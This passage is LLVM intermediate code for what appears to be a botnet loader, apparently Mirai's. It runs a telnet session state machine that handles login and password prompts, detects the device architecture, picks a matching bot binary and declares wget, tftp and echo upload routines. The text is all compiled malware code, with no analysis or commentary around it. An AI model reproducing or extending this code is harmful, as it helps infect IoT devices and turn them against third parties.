  %659 = load %struct.connection*, %struct.connection** %6, align 8
  %660 = getelementptr inbounds %struct.connection, %struct.connection* %659, i32 0, i32 3
  %661 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %660, i32 0, i32 6
  %662 = load i32, i32* %661, align 8
  %663 = icmp eq i32 %662, 0
  br i1 %663, label %664, label %692

664:                                              ; preds = %658
  %665 = load %struct.connection*, %struct.connection** %6, align 8
  %666 = getelementptr inbounds %struct.connection, %struct.connection* %665, i32 0, i32 7
  %667 = load i32, i32* %666, align 4
  %668 = icmp ne i32 %667, 1
  br i1 %668, label %669, label %692

669:                                              ; preds = %664
  %670 = load %struct.connection*, %struct.connection** %6, align 8
  %671 = getelementptr inbounds %struct.connection, %struct.connection* %670, i32 0, i32 5
  store i32 0, i32* %671, align 4
  %672 = load %struct.connection*, %struct.connection** %6, align 8
  %673 = getelementptr inbounds %struct.connection, %struct.connection* %672, i32 0, i32 6
  store i32 1, i32* %673, align 8
  %674 = load %struct.connection*, %struct.connection** %6, align 8
  %675 = getelementptr inbounds %struct.connection, %struct.connection* %674, i32 0, i32 7
  store i32 1, i32* %675, align 4
  %676 = load %struct.connection*, %struct.connection** %6, align 8
  %677 = getelementptr inbounds %struct.connection, %struct.connection* %676, i32 0, i32 10
  store i32 14, i32* %677, align 8
  %678 = load %struct.connection*, %struct.connection** %6, align 8
  %679 = getelementptr inbounds %struct.connection, %struct.connection* %678, i32 0, i32 13
  store i16 45, i16* %679, align 2
  %680 = load %struct.connection*, %struct.connection** %6, align 8
  %681 = getelementptr inbounds %struct.connection, %struct.connection* %680, i32 0, i32 4
  %682 = load i32, i32* %681, align 8
  %683 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %682, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.23, i64 0, i64 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.25, i64 0, i64 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.24, i64 0, i64 0))
  %684 = load %struct.connection*, %struct.connection** %6, align 8
  %685 = getelementptr inbounds %struct.connection, %struct.connection* %684, i32 0, i32 4
  %686 = load i32, i32* %685, align 8
  %687 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %686, i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.42, i64 0, i64 0))
  %688 = load %struct.connection*, %struct.connection** %6, align 8
  %689 = getelementptr inbounds %struct.connection, %struct.connection* %688, i32 0, i32 4
  %690 = load i32, i32* %689, align 8
  %691 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %690, i8* getelementptr inbounds ([121 x i8], [121 x i8]* @.str.26, i64 0, i64 0))
  br label %779

692:                                              ; preds = %664, %658
  %693 = load %struct.connection*, %struct.connection** %6, align 8
  %694 = getelementptr inbounds %struct.connection, %struct.connection* %693, i32 0, i32 16
  %695 = load i8, i8* %694, align 2
  %696 = icmp ne i8 %695, 0
  br i1 %696, label %756, label %697

697:                                              ; preds = %692
  %698 = load %struct.connection*, %struct.connection** %6, align 8
  %699 = getelementptr inbounds %struct.connection, %struct.connection* %698, i32 0, i32 3
  %700 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %699, i32 0, i32 2
  %701 = getelementptr inbounds [6 x i8], [6 x i8]* %700, i64 0, i64 0
  %702 = call i32 @strncmp(i8* %701, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.30, i64 0, i64 0), i64 3) #10
  %703 = icmp eq i32 %702, 0
  br i1 %703, label %704, label %756

704:                                              ; preds = %697
  %705 = load %struct.connection*, %struct.connection** %6, align 8
  %706 = getelementptr inbounds %struct.connection, %struct.connection* %705, i32 0, i32 5
  store i32 0, i32* %706, align 4
  %707 = load %struct.connection*, %struct.connection** %6, align 8
  %708 = getelementptr inbounds %struct.connection, %struct.connection* %707, i32 0, i32 6
  store i32 0, i32* %708, align 8
  %709 = load %struct.connection*, %struct.connection** %6, align 8
  %710 = getelementptr inbounds %struct.connection, %struct.connection* %709, i32 0, i32 7
  store i32 0, i32* %710, align 4
  %711 = load %struct.connection*, %struct.connection** %6, align 8
  %712 = getelementptr inbounds %struct.connection, %struct.connection* %711, i32 0, i32 8
  store i32 0, i32* %712, align 8
  %713 = load %struct.connection*, %struct.connection** %6, align 8
  %714 = getelementptr inbounds %struct.connection, %struct.connection* %713, i32 0, i32 3
  %715 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %714, i32 0, i32 2
  %716 = getelementptr inbounds [6 x i8], [6 x i8]* %715, i64 0, i64 0
  %717 = load %struct.connection*, %struct.connection** %6, align 8
  %718 = getelementptr inbounds %struct.connection, %struct.connection* %717, i32 0, i32 3
  %719 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %718, i32 0, i32 2
  %720 = getelementptr inbounds [6 x i8], [6 x i8]* %719, i64 0, i64 3
  %721 = load i8, i8* %720, align 1
  %722 = sext i8 %721 to i32
  %723 = icmp eq i32 %722, 0
  %724 = zext i1 %723 to i64
  %725 = select i1 %723, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.43, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.30, i64 0, i64 0)
  %726 = call i8* @strcpy(i8* %716, i8* %725) #8
  %727 = load %struct.connection*, %struct.connection** %6, align 8
  %728 = getelementptr inbounds %struct.connection, %struct.connection* %727, i32 0, i32 3
  %729 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %728, i32 0, i32 2
  %730 = getelementptr inbounds [6 x i8], [6 x i8]* %729, i64 0, i64 0
  %731 = load %struct.connection*, %struct.connection** %6, align 8
  %732 = getelementptr inbounds %struct.connection, %struct.connection* %731, i32 0, i32 3
  %733 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %732, i32 0, i32 2
  %734 = getelementptr inbounds [6 x i8], [6 x i8]* %733, i64 0, i64 0
  %735 = call i64 @strlen(i8* %734) #10
  %736 = trunc i64 %735 to i32
  %737 = call %struct.binary* @binary_get_by_arch(i8* %730, i32 %736)
  %738 = load %struct.connection*, %struct.connection** %6, align 8
  %739 = getelementptr inbounds %struct.connection, %struct.connection* %738, i32 0, i32 2
  store %struct.binary* %737, %struct.binary** %739, align 8
  %740 = load %struct.connection*, %struct.connection** %6, align 8
  %741 = getelementptr inbounds %struct.connection, %struct.connection* %740, i32 0, i32 4
  %742 = load i32, i32* %741, align 8
  %743 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %742, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.23, i64 0, i64 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.25, i64 0, i64 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.24, i64 0, i64 0))
  %744 = load %struct.connection*, %struct.connection** %6, align 8
  %745 = getelementptr inbounds %struct.connection, %struct.connection* %744, i32 0, i32 4
  %746 = load i32, i32* %745, align 8
  %747 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %746, i8* getelementptr inbounds ([121 x i8], [121 x i8]* @.str.26, i64 0, i64 0))
  %748 = load %struct.connection*, %struct.connection** %6, align 8
  %749 = getelementptr inbounds %struct.connection, %struct.connection* %748, i32 0, i32 4
  %750 = load i32, i32* %749, align 8
  %751 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %750, i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.29, i64 0, i64 0))
  %752 = load %struct.connection*, %struct.connection** %6, align 8
  %753 = getelementptr inbounds %struct.connection, %struct.connection* %752, i32 0, i32 10
  store i32 13, i32* %753, align 8
  %754 = load %struct.connection*, %struct.connection** %6, align 8
  %755 = getelementptr inbounds %struct.connection, %struct.connection* %754, i32 0, i32 16
  store i8 1, i8* %755, align 2
  br label %779

756:                                              ; preds = %697, %692
  br label %757

757:                                              ; preds = %756
  br label %758

758:                                              ; preds = %757, %653
  %759 = load %struct.connection*, %struct.connection** %6, align 8
  %760 = getelementptr inbounds %struct.connection, %struct.connection* %759, i32 0, i32 4
  %761 = load i32, i32* %760, align 8
  %762 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %761, i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.44, i64 0, i64 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.25, i64 0, i64 0))
  %763 = load %struct.connection*, %struct.connection** %6, align 8
  %764 = getelementptr inbounds %struct.connection, %struct.connection* %763, i32 0, i32 10
  store i32 18, i32* %764, align 8
  %765 = load %struct.connection*, %struct.connection** %6, align 8
  %766 = getelementptr inbounds %struct.connection, %struct.connection* %765, i32 0, i32 13
  store i16 45, i16* %766, align 2
  br label %767

767:                                              ; preds = %758, %646
  br label %779

768:                                              ; preds = %180
  %769 = load %struct.connection*, %struct.connection** %6, align 8
  %770 = call i32 @connection_consume_cleanup(%struct.connection* %769)
  store i32 %770, i32* %11, align 4
  %771 = icmp sgt i32 %770, 0
  br i1 %771, label %772, label %777

772:                                              ; preds = %768
  %773 = load %struct.connection*, %struct.connection** %6, align 8
  %774 = getelementptr inbounds %struct.connection, %struct.connection* %773, i32 0, i32 4
  %775 = load i32, i32* %774, align 8
  store i32 %775, i32* %13, align 4
  %776 = load %struct.connection*, %struct.connection** %6, align 8
  call void @connection_close(%struct.connection* %776)
  br label %777

777:                                              ; preds = %772, %768
  br label %778

778:                                              ; preds = %180, %777
  store i32 0, i32* %11, align 4
  br label %779

779:                                              ; preds = %778, %767, %704, %669, %645, %591, %533, %491, %428, %397, %349, %302, %281, %248, %220, %192
  %780 = load i32, i32* %11, align 4
  %781 = icmp eq i32 %780, 0
  br i1 %781, label %782, label %783

782:                                              ; preds = %779
  br label %831

783:                                              ; preds = %779
  %784 = load i32, i32* %11, align 4
  %785 = load %struct.connection*, %struct.connection** %6, align 8
  %786 = getelementptr inbounds %struct.connection, %struct.connection* %785, i32 0, i32 12
  %787 = load i16, i16* %786, align 8
  %788 = zext i16 %787 to i32
  %789 = icmp sgt i32 %784, %788
  br i1 %789, label %790, label %795

790:                                              ; preds = %783
  %791 = load %struct.connection*, %struct.connection** %6, align 8
  %792 = getelementptr inbounds %struct.connection, %struct.connection* %791, i32 0, i32 12
  %793 = load i16, i16* %792, align 8
  %794 = zext i16 %793 to i32
  store i32 %794, i32* %11, align 4
  br label %795

795:                                              ; preds = %790, %783
  %796 = load i32, i32* %11, align 4
  %797 = load %struct.connection*, %struct.connection** %6, align 8
  %798 = getelementptr inbounds %struct.connection, %struct.connection* %797, i32 0, i32 12
  %799 = load i16, i16* %798, align 8
  %800 = zext i16 %799 to i32
  %801 = sub nsw i32 %800, %796
  %802 = trunc i32 %801 to i16
  store i16 %802, i16* %798, align 8
  %803 = load %struct.connection*, %struct.connection** %6, align 8
  %804 = getelementptr inbounds %struct.connection, %struct.connection* %803, i32 0, i32 18
  %805 = getelementptr inbounds [8192 x i8], [8192 x i8]* %804, i64 0, i64 0
  %806 = load %struct.connection*, %struct.connection** %6, align 8
  %807 = getelementptr inbounds %struct.connection, %struct.connection* %806, i32 0, i32 18
  %808 = getelementptr inbounds [8192 x i8], [8192 x i8]* %807, i64 0, i64 0
  %809 = load i32, i32* %11, align 4
  %810 = sext i32 %809 to i64
  %811 = getelementptr inbounds i8, i8* %808, i64 %810
  %812 = load %struct.connection*, %struct.connection** %6, align 8
  %813 = getelementptr inbounds %struct.connection, %struct.connection* %812, i32 0, i32 12
  %814 = load i16, i16* %813, align 8
  %815 = zext i16 %814 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* align 8 %805, i8* align 1 %811, i64 %815, i1 false)
  %816 = load %struct.connection*, %struct.connection** %6, align 8
  %817 = getelementptr inbounds %struct.connection, %struct.connection* %816, i32 0, i32 18
  %818 = load %struct.connection*, %struct.connection** %6, align 8
  %819 = getelementptr inbounds %struct.connection, %struct.connection* %818, i32 0, i32 12
  %820 = load i16, i16* %819, align 8
  %821 = zext i16 %820 to i64
  %822 = getelementptr inbounds [8192 x i8], [8192 x i8]* %817, i64 0, i64 %821
  store i8 0, i8* %822, align 1
  br label %823

823:                                              ; preds = %795
  %824 = load %struct.connection*, %struct.connection** %6, align 8
  %825 = getelementptr inbounds %struct.connection, %struct.connection* %824, i32 0, i32 12
  %826 = load i16, i16* %825, align 8
  %827 = zext i16 %826 to i32
  %828 = icmp sgt i32 %827, 8196
  br i1 %828, label %829, label %830

829:                                              ; preds = %823
  call void @abort() #9
  unreachable

830:                                              ; preds = %823
  br label %180

831:                                              ; preds = %782
  br label %129

832:                                              ; preds = %161
  br label %833

833:                                              ; preds = %30, %65, %87, %832, %119, %113
  ret void
}

; Function Attrs: nounwind readnone willreturn
declare i64 @pthread_self() #6

; Function Attrs: nounwind
declare i32 @pthread_setaffinity_np(i64, i64, %struct.cpu_set_t*) #1

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

declare i64 @recv(i32, i8*, i64, i32) #3

; Function Attrs: noreturn nounwind
declare void @abort() #2

declare i32 @connection_consume_iacs(%struct.connection*) #3

declare i32 @connection_consume_login_prompt(%struct.connection*) #3

declare signext i8 @util_sockprintf(i32, i8*, ...) #3

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

declare i32 @connection_consume_password_prompt(%struct.connection*) #3

declare i32 @connection_consume_prompt(%struct.connection*) #3

declare i32 @connection_consume_copy_op(%struct.connection*) #3

declare i32 @connection_consume_arch(%struct.connection*) #3

declare %struct.binary* @binary_get_by_arch(i8*, i32) #3

; Function Attrs: nounwind readonly willreturn
declare i64 @strlen(i8*) #7

; Function Attrs: nounwind readonly willreturn
declare i32 @strcmp(i8*, i8*) #7

declare i32 @connection_consume_arm_subtype(%struct.connection*) #3

declare i32 @connection_consume_upload_methods(%struct.connection*) #3

declare i32 @connection_upload_echo(%struct.connection*) #3

; Function Attrs: nounwind readonly willreturn
declare i32 @strncmp(i8*, i8*, i64) #7

declare i32 @connection_upload_wget(%struct.connection*) #3

declare i32 @connection_upload_tftp(%struct.connection*) #3

declare i32 @connection_verify_payload(%struct.connection*) #3

declare i32 @connection_consume_cleanup(%struct.connection*) #3

; Function Attrs: argmemonly nofree nounwind willreturn
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i1 immarg) #5

attributes #0 = { noinline nounwind optnone sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { argmemonly nofree nounwind willreturn writeonly }
attributes #5 = { argmemonly nofree nounwind willreturn }
attributes #6 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #7 = { nounwind readonly willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #8 = { nounwind }
attributes #9 = { noreturn nounwind }
attributes #10 = { nounwind readonly willreturn }
attributes #11 = { nounwind readnone willreturn }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"clang version 13.0.1"}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
